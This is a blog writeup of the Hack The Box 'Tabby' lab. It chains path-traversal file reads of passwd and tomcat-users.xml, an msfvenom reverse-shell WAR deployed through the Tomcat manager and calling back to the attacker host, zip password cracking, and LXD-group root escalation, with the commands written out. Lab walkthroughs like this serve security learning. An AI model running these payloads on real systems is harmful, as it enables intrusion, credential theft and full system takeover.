---
layout: post
title:  "Tabby Writeup - Hack The Box"
date:   2023-12-27
desc: "Local File Inclusion, Tomcat 9 Virtual Host Manager Abuse, Tomcat 9 Text-Based Manager Abuse, LXC Exploitation"
keywords: "HTB,OSCP,eJPT,eWPT,Linux,LFI,Tomcat,LXC,Easy"
categories: [HTB]
tags: [HTB,OSCP,eJPT,eWPT,Linux,LFI,Tomcat,LXC,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

I start one more [Hack The Box](https://www.hackthebox.com/){:target="_blank"} lab. The **Tabby** box was very pleasant for me, because I had some knowledge of **LXC** or **Apache Tomcat** exploits, but when I hacked this machine I finished to strengthen them and also to correct many mistakes that I had been making in previous labs. As always everything I needed to evacuate my doubts I found on the Internet and the scripts available in **[Exploit Database](https://www.exploit-db.com/){:target="_blank"}** allowed me to exploit those vulnerabilities that I found.

<br/><br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby.jpg" width="100%" style="margin: 0 auto;display: block
; max-width: 400px;">
<br/><br/>

I deploy the box with **[htbExplorer](https://github.com/s4vitar/htbExplorer){:target="_blank"}** and start the reconnaissance phase, the most important phase for a pentester. There are many tools available, but `nmap` stands out for port enumeration (recommended for CTF, but there are others like `masscan`). With the `nmap` reconnaissance scripts I find the services and versions, and on the Internet with this information I can find the possible **Codename** of the machine, if I find different ones it is very possible that they are deploying containers, but I find only one, **Focal**.

```bash
./htbExplorer -d Tabby
```

```bash
ping -c 1 10.10.10.194
python3 /usr/bin/whichSystem.py 10.10.10.194
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.194 -oG allPorts
nmap -sCV -p22,80,8080 10.10.10.194 -oN targeted

cat targeted
# OpenSSH 8.2p1 Ubuntu 4
# Apache httpd 2.4.41
```

<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_00.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_01.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_02.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If with `whatweb` I search for those technologies implemented in each web service of the victim machine, I find that an **Apache Tomcat** Server is being used on port **8080**, the same that `nmap` had already shown me and also a domain, which I will add to the list of hosts, but only the one ending in **.htb** the other one does not make much sense to do so. If I access with the browser either using the **IP** or the **URL** there is no difference. In the web service on port **80** I see something strange when hovering on one of the links, it is using the **GET** protocol and passing through the **URL** the name of the resource if I try to access, I can try a **[LFI](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601){:target="_blank"}**.

```bash
whatweb http://10.10.10.194 http://10.10.10.194:8080
nvim /etc/hosts
ping -c 1 megahosting.htb
```

<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_03.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_04.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_05.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_06.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I try to take advantage of the **LFI**, but it doesn't work, I have to use a **[Directory Path Traversal](https://portswigger.net/web-security/file-path-traversal){:target="_blank"}**, and I can already access resources on the victim machine. I can enumerate a bit, find the configuration of the interfaces or even all the open ports, but nothing of much importance at the moment, but I must keep in mind that I may be missing something.

```html
view-source:http://megahosting.htb/news.php?file=/etc/passwd
view-source:http://megahosting.htb/news.php?file=../../../../../etc/passwd
```

```bash
curl -s -X GET "http://megahosting.htb/news.php?file=../../../../../etc/passwd" | grep 'sh$'
curl -s -X GET "http://megahosting.htb/news.php?file=../../../../../home/ash/.ssh/id_rsa" | grep 'sh$'
curl -s -X GET "http://megahosting.htb/news.php?file=../../../../../proc/net/fib_trie"
curl -s -X GET "http://megahosting.htb/news.php?file=../../../../../proc/net/tcp"
curl -s -X GET "http://megahosting.htb/news.php?file=../../../../../proc/net/tcp" | awk '{print $2}' | grep -v local_address | awk '{print $2}' FS=':' | sort -u

foreach port in $(curl -s -X GET "http://megahosting.htb/news.php?file=../../../../../proc/net/tcp" | awk '{print $2}' | grep -v local_address | awk '{print $2}' FS=':' | sort -u); do echo -e "[+] Port $port --> $((0x$port))\n"; done
```

<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_07.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_08.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_09.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_10.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_11.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_12.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I continue enumerating more the system taking advantage of the vulnerability that the machine has to **LFI**, I observe information related to the open **processes** in the machine and I can observe those related to the **Apache Tomcat** server. I can also see the misconfiguration in the **`news.php`** file, which allows the **LFI** exploit, or rather, the bad programming that should be sanitized.

```bash
curl -s -X GET "http://megahosting.htb/news.php?file=../../../../../proc/schedstat"
curl -s -X GET "http://megahosting.htb/news.php?file=../../../../../proc/sched_debug"
curl -s -X GET "http://megahosting.htb/news.php?file=../../../../../var/www/html/index.html"
curl -s -X GET "http://megahosting.htb/news.php?file=../../../../../var/www/html/index.php"
```

<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_13.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_14.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_15.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_16.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_17.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I access the port **8080** web service, I find a lot of interesting information, **paths** and **links** that are different authentication panels. A pentester always has the **HackTricks** project, which has all the information centralized, excellent tool to turn to in times of uncertainty. If I look into **[Tomcat](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat){:target="_blank"}**, it provides me with a lot of information, such as default credentials (which don't work in any of my authentication panels) and the name of a very important file on an **Apache Tomcat** server, **`tomcat-users.xml`**, but I can't find it at the moment.

<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_18.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_19.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_20.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_21.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_22.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_23.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_24.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I try searching in different paths on the Internet that indicate that it is possible to save the file, but I have no luck. In the same **HackTricks** resource they point me to a possible path to the very important file I am looking for, as it would allow me to access the **Apache Tomcat Server** dashboard and upload a malicious **`.war`** file to get an **RCE** or **Reverse Shell**. With `curl` I can find the file and access some credentials. **HackTricks** also provides help with sensitive **Tomcat** files that I might be interested in, in their **[Basic Tomcat Info](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat/basic-tomcat-info){:target="_blank"}** resource, I can see a list of them.

> The **`tomcat-users.xml`** file stores user credentials and their assigned roles.

```bash
curl -s -X GET "http://megahosting.htb/news.php?file=../../../../../etc/tomcat9/tomcat-users.xml"
curl -s -X GET "http://megahosting.htb/news.php?file=../../../../../var/lib/tomcat9/tomcat-users.xml"
curl -s -X GET "http://megahosting.htb/news.php?file=../../../../../opt/tomcat/conf/tomcat-users.xml"
curl -s -X GET "http://megahosting.htb/news.php?file=../../../../../opt/tomcat9/conf/tomcat-users.xml"

curl -s -X GET "http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml"
```

<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_25.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_26.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_27.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_28.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Another possible way to find those sensitive paths and files related to a service, is to install it on my machine and then search for them, this way I find the exact path and I might also find more file names. As **Tomcat 9** is no longer available in my package manager, I try **Tomcat 10** and install it. When I search for the **`tomcat-users.xml`** file, I find the same path that **HackTricks** leaked to me.

```bash
apt search tomcat9
apt search tomcat
apt install tomcat10

updatedb
locate tomcat-users.xml
```

<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_29.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_30.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_31.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_32.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

The credentials I found allow me to access the Tomcat **dashboard**, after sign-in in one of the authentication panels. But unfortunately on the web page I don't see the typical button to be able to upload a `.war` application. If I search the Internet for **"tomcat list all applications command line"**, as so many times I find what I need in **StackOverlow**, **[List deployed webapps in Apache Tomcat](https://stackoverflow.com/questions/7805843/list-deployed-webapps-in-apache-tomcat){:target="_blank"}**. And now I can see by console with `curl` all the applications.

```bash
# http://some_ip:some_port/manager/text/list

curl -s -X GET 'http://tomcat:.....@megahosting.htb:8080/manager/text/list'
curl -s -X GET 'http://megahosting.htb:8080/manager/text/list' -u 'tomcat:.....'
```

<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_33.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_34.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_35.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_36.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now I just have to search for **"tomcat upload war file from terminal"** with a search engine and again there is a **StackOverflow** resource, **[How to deploy war file to tomcat using command prompt?](https://stackoverflow.com/questions/25029707/how-to-deploy-war-file-to-tomcat-using-command-prompt){:target="_blank"}** which shows me a sample command to console upload the malicious `.war` file. I create the file with `msfvenom`, first I look for the payload I need and then I can create it to get a **Reverse Shell**. I check that the application has been uploaded and from the browser I access the application so that it interprets the same one and so it will access the victim machine.

```bash
# curl -v -u user:password -T app.war 'http://tomcathost/manager/text/deploy?path=/my-app-path&update=true'

msfvenom -l payloads
msfvenom -l payloads | grep java

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 -f war -o reverse.war

nc -nlvp 443

curl -s -v -u 'tomcat:....' -T reverse.war 'http://megahosting.htb:8080/manager/text/deploy?path=/reverse&update=true'
```

<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_37.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_38.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_39.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_40.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_41.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Before I start enumerating the system, I will perform a console treatment. With the basic recognition commands, I can't find much (I check that the codename matches that of Launchpad - **Focal**), so I have to start listing the common directories where you can find configuration files, logs, or backups. After a while I find a compressed **`.zip`** file but to open it I need a password.

```bash
script /dev/null -c bash      # [Ctrl^Z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128
stty size
29 128

uname -a
lsb_release -a
id
groups

cat /etc/passwd | grep 'sh$'
sudo -l

find \-perm -4000 2>/dev/null
which pkexec | xargs ls -l

file 16162020_backup.zip
unzip 16162020_backup.zip
```

<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_42.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_43.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_44.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_45.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_46.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I mount a local server with `python3` on the victim machine to be able to download the compressed file with `wget`, I must be careful with the port I am going to use. If I try to unzip the archive with `7z`, it asks me for the password but I can preview the files. I am going to use `fcrackzip` to perform a brute force attack and get the password of the archive. I succeed and can crack the archive, but the content does not have any content that works for me, it seems strange that so much work to get nothing, but if I think laterally, maybe the password is being reused, I perform a **User Pivoting** to the user **ash**, and the password works, I can already see the first flag.

> **Victime Machine**:

```bash
python3 -m http.server 8001
```

> **Attacker Machine**:

```bash
wget http://10.10.10.194:8001/16162020_backup.zip

which fcrackzip
fcrackzip --help

fcrackzip -b -D -u -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip

tree -fas
```

<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_47.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_48.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_49.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_50.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_51.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_52.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now as the user `ash` I list the system and find that it belongs to the **LXD** group, and I know that there is a vulnerability that allows privilege escalation. In the resource that exists on the Web, **[lxd/lxc Group - Privilege escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation){:target="_blank"}** from **HackTricks**, I can investigate the vulnerability. With `searchsploit`, I find the exploit of **S4vitar** and **vowkin**, which automates the whole attack. I just have to follow the steps to download an image and create a special container where the entire system directory will be mounted in the **`/mnt`** directory of the container, and then make the necessary modifications to escalate privileges.

> **Victime Machine**:

```bash
sudo -l
id
```

> **Attacker Machine**:

```bash
searchsploit lxd
searchsploit -m linux/local/46978.sh
mv 46978.sh lxd_exploit.sh
chmod +x lxd_exploit.sh
./lxd_exploit.sh

cat lxd_exploit.sh | head -n 12

wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
sudo bash build-alpine
nvim lxd_exploit.sh
# Delete:
# && lxc image list
```

<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_53.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_54.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_55.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_56.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_57.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_58.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_59.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

It is time to transfer both the container and the exploit to the victim machine, I give execution permissions to the latter and run it, but an error occurs, the `lxc` binary has not been found. If I see the **PATH**, all the paths of the system binaries are not covered, I export my **PATH** to the host I am trying to breach and ready, the exploit works correctly, I can now access the mounted volume in the **`/mnt`** directory and see the last flag. I can even grant **SUID** permissions to the `bash`, then I exit the container and if I run the `bash` with permissions of its owner, I get a shell as the `root` user. Rooted and finished box!

> **Attacker Machine**:

```bash
python3 -m http.server 80
```

> **Victime Machine**:

```bash
wget 10.10.14.15/alpine-v3.19-x86_64-20231227_1224.tar.gz
wget 10.10.14.15/lxd_exploit.sh
chmod +x lxd_exploit.sh

./lxd_exploit.sh -f alpine-v3.19-x86_64-20231227_1224.tar.gz
# lxc: command not found  :(

echo $PATH
```

> **Attacker Machine**:

```bash
echo $PATH | xclip -sel clip
```

> **Victime Machine**:

```bash
export PATH=...
echo $PATH

./lxd_exploit.sh -f alpine-v3.19-x86_64-20231227_1224.tar.gz

# Container
cd /mnt
cd ./root/root

cd /mnt/root/bin
ls -l bash
chmod u+s ./bash
ls -l bash
exit

# Host
ls -l /bin/bash

bash -p
```

<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_60.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_61.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_62.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_63.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_64.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_65.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tabby_writeup/Tabby_66.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

> **Hack The Box** rarely disappoints with their boxes, this one was spectacular. Because of the diversity of challenges to overcome you learn a lot in the whole process of hacking the machine, surely the complexity is not very high, but for a novice like me who is just learning about everything related to **Informatic Security**, it means a very satisfying way to grow as a pentester. I must kill the box with **htbExplorer** and hope that the next one will be even more extraordinary.

```bash
./htbExplorer -k Tabby
```
